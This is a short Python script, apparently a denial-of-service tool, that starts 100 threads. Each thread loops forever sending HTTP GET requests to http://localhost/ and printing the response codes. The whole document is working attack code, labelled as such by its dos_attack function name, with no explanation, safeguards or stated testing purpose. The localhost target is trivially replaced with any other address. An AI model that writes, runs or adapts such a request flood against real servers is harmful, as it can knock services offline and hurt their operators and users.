import requests
import threading

def dos_attack():
    while True:
        try:
            response = requests.get("http://localhost/")
            print(f"Sent request, received status code: {response.status_code}")
        except requests.exceptions.RequestException as e:
            print(f"Error: {e}")

for i in range(100):
    thread = threading.Thread(target=dos_attack)
    thread.start()